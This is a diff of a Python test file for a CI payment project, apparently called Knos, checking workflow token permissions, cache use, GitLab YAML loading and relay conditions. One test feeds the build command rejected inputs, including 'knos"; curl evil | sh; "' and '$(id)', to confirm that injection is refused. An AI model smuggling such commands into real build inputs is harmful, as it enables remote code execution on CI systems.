@@ -23,6 +23,7 @@ from _ghexpr import runs, value
 ROOT = Path(__file__).resolve().parents[1]
 WF = ROOT / ".github" / "workflows"
 EXAMPLES = ROOT / "examples"
+GITLAB = EXAMPLES / "gitlab"                                  # a .gitlab-ci.yml: not a GitHub workflow, so not read as one
 CLAIM_COPY = ROOT / "src" / "knos" / "settle" / "knos-claim.yml"
 REUSABLE = ("fund.yml", "prove.yml", "check.yml")             # the three that take no inputs
 ATTEST = "attest.yml"                                         # the fourth published workflow: it takes facts, never code
@@ -144,7 +145,8 @@ def test_what_a_repository_installs_is_what_knos_runs_on_itself():
     assert 'cp examples/knos-claim.yml "$out/knos-claim.yml"' in (ROOT / "scripts" / "build_site.sh").read_text(encoding="utf-8")
     # one payment file and one optional check: nothing else to install, and nothing still calls the first deployment's relay
     assert sorted(p.name for p in EXAMPLES.glob("*.yml")) == ["knos-attest.yml", "knos-attestor.yml", "knos-canary.yml", "knos-check.yml",
-                                                              "knos-claim-org.yml", "knos-claim.yml", "knos-workflow.yml"]
+                                                              "knos-claim-org.yml", "knos-claim.yml", "knos-install.yml", "knos-meter-batch.yml",
+                                                              "knos-workflow.yml"]
     # an organisation's claim file, which `knos claim --org` puts into <organisation>/knos-claim, is its example byte for byte
     assert (ROOT / "src" / "knos" / "settle" / "knos-claim-org.yml").read_bytes() == (EXAMPLES / "knos-claim-org.yml").read_bytes()
     assert not (WF / "relay.yml").exists() and not any("relay.yml" in p.read_text(encoding="utf-8") for p in _mine())
@@ -211,7 +213,16 @@ def test_a_token_is_asked_for_only_by_jobs_that_run_no_pull_request_code_and_che
     assert minting == {("fund.yml", "command"), ("prove.yml", "settle"), ("prove.yml", "attest"), ("keys.yml", "keys"),
                        (ATTEST, "attest"), ("knos-attest.yml", "attest"), ("knos-attestor.yml", "command"), ("knos-attestor.yml", "settle"),
                        *((f, j) for f in ("knos.yml", "knos-workflow.yml") for j in ("command", "settle", "review")),
+                       ("knos-install.yml", "command"), ("knos-install.yml", "settle"),      # the file `knos install` opens a pull request with
+                       ("knos-meter-batch.yml", "timer"), ("knos-meter-batch.yml", "hand"),  # a meter batch: each a call to the pinned attest.yml
                        ("knos-claim.yml", "claim"), ("knos-claim-org.yml", "claim")}, minting
+    # an `auto` order adds no job, no event and no permission: prove.yml's attest job, after the judge, asks for the one
+    # token, and `knos settle --tests` decides its audience (knos3:auto for an open pull request of an order funded
+    # `auto`, knos3:pay otherwise; tests/test_flow_orders.py). The job that runs the submission still has no id-token.
+    prove = (WF / "prove.yml").read_text(encoding="utf-8")
+    assert "knos3:auto:<order>:<head sha>:<terms hash>:1:<pull request>:<the author's id>.10000.<address or ->" in prove
+    assert sorted(_jobs("prove.yml")) == ["attest", "judge", "review", "settle"] and _jobs("prove.yml")["attest"]["needs"] == ["review", "judge"]
+    assert _jobs("prove.yml")["judge"]["permissions"] == {"contents": "read"}
     assert not [job for job in _jobs("check.yml").values() if "id-token" in job["permissions"]]
     assert "id-token" not in _jobs("prove.yml")["judge"]["permissions"] and "id-token" not in _jobs("prove.yml")["review"]["permissions"]
     for name, job in sorted(SIGNS):
@@ -546,7 +557,7 @@ def test_no_job_that_signs_or_sees_a_secret_uses_a_cache():
     # ones that sign or see a secret are the three above and no other; and none of its jobs restores anything at all, since
     # what its build makes is held to the lock and attached to the release
     rel = _doc(WF / "release.yml")["jobs"]
-    assert {job for name, job in sensitive if name == "release.yml"} == {"registry", "crates", "npmjs"}
+    assert {job for name, job in sensitive if name == "release.yml"} == {"registry", "crates", "npmjs", "crates-trusted", "npm-trusted"}
     assert {name: _caches(job) for name, job in rel.items() if _caches(job)} == {}
     assert [s["with"] for s in _steps(rel["build"], "astral-sh/setup-uv@")] == [{"enable-cache": False}]
     # and it would catch the mistakes: uv's cache left at its default, a cache action, a rust cache, setup-node's automatic one
@@ -1008,9 +1019,56 @@ def _with_type(value, caller: dict) -> str:
 
 def _callers() -> list[Path]:
     """Every file a repository installs or Knos runs that can call a reusable workflow: Knos's own, the examples (at any
-    depth), and the copies the command line writes (src/knos/settle/*.yml)."""
-    found = {*WF.glob("*.yml"), *EXAMPLES.rglob("*.yml"), *(ROOT / "src" / "knos" / "settle").glob("*.yml")}
+    depth), and the copies the command line writes (src/knos/settle/*.yml). Not examples/gitlab: a .gitlab-ci.yml is
+    read by GitLab, which has no reusable workflows, no `jobs` and none of GitHub's expressions."""
+    found = {*WF.glob("*.yml"), *(p for p in EXAMPLES.rglob("*.yml") if GITLAB not in p.parents), *(ROOT / "src" / "knos" / "settle").glob("*.yml")}
     return sorted(p for p in found if "jobs" in (_doc(p) or {}))
+
+
+def test_every_yaml_file_under_examples_is_read_by_the_tests_that_know_its_rules():
+    """Three kinds, each with its own rules, and a file of no kind fails here instead of going unchecked:
+    examples/*.yml are what a repository installs for payment (this file: `_files`, `_mine`); examples/adapters/*.yml
+    start those workflows and sign nothing (tests/test_adapters.py reads each one, and `_callers` above); the file in
+    examples/gitlab is GitLab's (tests/test_gitlab_pay.py holds the escrow's rules for its tokens), so none of
+    GitHub's rules is asked of it here: only that it is YAML a pipeline can load."""
+    every = {p.relative_to(EXAMPLES).as_posix() for ext in ("*.yml", "*.yaml") for p in EXAMPLES.rglob(ext)}
+    top = {p.name for p in EXAMPLES.glob("*.yml")}
+    adapters = {p.relative_to(EXAMPLES).as_posix() for p in (EXAMPLES / "adapters").glob("*.yml")}
+    assert every == top | adapters | {"gitlab/.gitlab-ci.yml"}, sorted(every - top - adapters)
+    assert top <= {p.name for p in _files()} and top <= {p.name for p in _mine()}
+    assert adapters and {EXAMPLES / a for a in adapters} <= set(_callers())
+    listed = (ROOT / "tests" / "test_adapters.py").read_text(encoding="utf-8")
+    assert all(Path(a).name in listed or Path(a).stem in listed for a in adapters), "an adapter tests/test_adapters.py does not name"
+    assert all("jobs" in _doc(EXAMPLES / a) and _doc(EXAMPLES / a)["permissions"] == {} for a in adapters)
+
+
+def test_the_gitlab_example_is_yaml_a_pipeline_can_load_and_its_paying_job_reads_the_audience_it_was_given(tmp_path):
+    """examples/gitlab/.gitlab-ci.yml as a YAML reader takes it (0.3.14's first copy was not YAML: a here-document in a
+    plain list entry, and an entry holding `: `). Every job's script is a list of text, and the entry of knos-pay that
+    splits the audience is one block of three lines that a shell runs as written: it gives the order, the head, the
+    terms, the mode, the merge request and the payees."""
+    import yaml
+    doc = yaml.safe_load((GITLAB / ".gitlab-ci.yml").read_text(encoding="utf-8"))
+    assert isinstance(doc, dict) and "jobs" not in doc and set(doc) == {"stages", ".knos", "knos-fund", "knos-pay"}
+    jobs = {name: job for name, job in doc.items() if isinstance(job, dict)}
+    assert all(isinstance(job.get("script", []), list) and all(isinstance(line, str) for line in job.get("script", [])) for job in jobs.values())
+    assert doc[".knos"]["id_tokens"] == {"KNOS_TOKEN": {"aud": "$KNOS_AUD"}} and all(doc[j]["extends"] == ".knos" for j in ("knos-fund", "knos-pay"))
+    script = doc["knos-pay"]["script"]
+    [split] = [line for line in script if "<<EOF" in line]
+    assert split == "IFS=: read -r _ _ ORDER HEAD TERMS MODE MR PAYEES <<EOF\n$KNOS_AUD\nEOF\n"
+    assert 'jq -r .description mr.json | grep -qx "Knos-Pay-To: $ADDRESS"' in script and script[-1] == "printf '%s' \"$KNOS_TOKEN\" > knos-token.jwt"
+    sh = shutil.which("sh")
+    if sh is None:
+        pytest.skip("no sh on this machine to run the script's lines with")
+    payee, address = 900000000000000000 + 77, "EwSxyJFNQkNN9qtss4Qd7DTvrNYb62vgvhdwqgfErXDz"
+    aud = f"knos3:pay:{'o' * 44}:{'a' * 40}:{'b' * 64}:0:12:{payee}.10000.{address}"
+    lines = [split, script[script.index(split) + 1], script[script.index(split) + 2], 'echo "$ORDER $HEAD $TERMS $MODE $MR $PAYEE $SHARE $ADDRESS"']
+    assert lines[1].startswith('PAYEE="${PAYEES%%.*}"') and lines[2].startswith('test "$SHARE" = 10000')
+    r = subprocess.run([sh, "-ec", "\n".join(lines)], env={"KNOS_AUD": aud, "PATH": os.environ.get("PATH", "")}, capture_output=True, text=True, timeout=30, cwd=tmp_path, check=False)
+    assert r.returncode == 0 and r.stdout.split() == ["o" * 44, "a" * 40, "b" * 64, "0", "12", str(payee), "10000", address], r.stdout + r.stderr
+    split_share = subprocess.run([sh, "-ec", "\n".join(lines)], env={"KNOS_AUD": aud.replace(".10000.", ".5000."), "PATH": os.environ.get("PATH", "")}, capture_output=True, text=True,
+                                 timeout=30, cwd=tmp_path, check=False)
+    assert split_share.returncode != 0 and split_share.stdout == ""          # a split is not this example's to pay: the job ends before the token leaves it
 
 
 def test_every_value_handed_to_a_typed_input_of_a_called_workflow_has_that_type_when_github_evaluates_it():
@@ -1226,7 +1284,7 @@ def test_the_lock_is_for_the_release_the_workflows_name_and_holds_the_wheel_and_
     good = lock.read_text(encoding="utf-8")
     last = good.splitlines()[-1]
     for wrong in (good.replace(last, ""), good + "typer==0.0.1 --hash=sha256:" + "0" * 64 + "\n", good.replace(last, last[:-1]),
-                  good.replace(last, last.replace(_release(), "9.9.9")), good.replace("solders==", "solderz=="), "knos==0.3.13 --hash=sha256:" + "a" * 64 + "\n"):
+                  good.replace(last, last.replace(_release(), "9.9.9")), good.replace("solders==", "solderz=="), "knos==0.3.14 --hash=sha256:" + "a" * 64 + "\n"):
         bad = tmp_path / "bad.txt"
         bad.write_text(wrong, encoding="utf-8")
         with pytest.raises(SystemExit, match="the lock is not"):
@@ -1263,7 +1321,7 @@ def test_a_rehearsal_variant_differs_in_how_knos_is_installed_and_in_nothing_els
             pub.main(["check", str(out)])                  # a checkout is checked against the set it was made as, named
     assert pub.main(["check", str(out), "--lock", str(_lock(tmp_path, pub))]) == 1
     capsys.readouterr()
-    for bad in ('knos"; curl evil | sh; "', "knos==0.3.13 # x", "$(id)", "knos\nrun: x", "a: b", "`id`", ""):
+    for bad in ('knos"; curl evil | sh; "', "knos==0.3.14 # x", "$(id)", "knos\nrun: x", "a: b", "`id`", ""):
         with pytest.raises(SystemExit):
             pub.main(["build", str(tmp_path / "bad"), "--source", bad])
     assert not (tmp_path / "bad").exists()
@@ -1439,7 +1497,22 @@ def test_the_next_worker_run_takes_over_before_this_one_stops_and_the_timer_star
     steps, gate = _steps(doc["jobs"]["relay"]), "steps.chain.outputs.go == 'true'"
     guard = steps[0]
     assert guard["id"] == "chain" and guard["env"]["AFTER"] == "${{ inputs.after }}"
-    assert [s.get("if") for s in steps[1:-1]] == [gate] * (len(steps) - 2) and steps[-1]["if"] == f"always() && {gate}"
+    # the last step also runs after a step that failed (always()), but it starts the next run only when THIS run relayed:
+    # a run whose relay failed, or relayed nothing, would otherwise start run after run that cannot relay either
+    last = f"always() && {gate} && steps.relay.outcome == 'success' && steps.relay.outputs.relayed == 'true'"
+    assert [s.get("if") for s in steps[1:-1]] == [gate] * (len(steps) - 2) and steps[-1]["if"] == last
+
+    def starts_next(go: str = "true", outcome: str = "success", relayed: str = "true", status: str = "success") -> bool:
+        context = {"steps": {"chain": {"outputs": {"go": go}}, "relay": {"outcome": outcome, "outputs": {"relayed": relayed} if relayed else {}}}}
+        return bool(value(steps[-1]["if"], context, status))
+    assert starts_next() and starts_next(status="failure")            # also when the hand-over step after the relay failed
+    assert not starts_next(outcome="failure", relayed="", status="failure")      # a failed relay starts no next run
+    assert not starts_next(relayed="")                                # it ended well but relayed nothing (no key): none either
+    assert not starts_next(outcome="skipped", relayed="") and not starts_next(go="false")
+    [relay] = [s for s in steps if s.get("id") == "relay"]
+    lines = relay["run"].strip().splitlines()
+    assert "knos relay --serve" in relay["run"] and lines[-1] == 'echo "relayed=true" >> "$GITHUB_OUTPUT"'      # said only once the relay ended well
+    assert lines.index(lines[-1]) > max(n for n, ln in enumerate(lines) if "knos relay --serve" in ln or "exit 1" in ln or "exit 0" in ln)
     serves = [s["run"] for s in steps if "knos relay --serve" in s.get("run", "")]
     assert len(serves) == 2 and all(s.count("knos relay --serve") == 1 for s in serves)
     first, tail = (int(re.search(r"--serve (\d+)", s).group(1)) for s in serves)
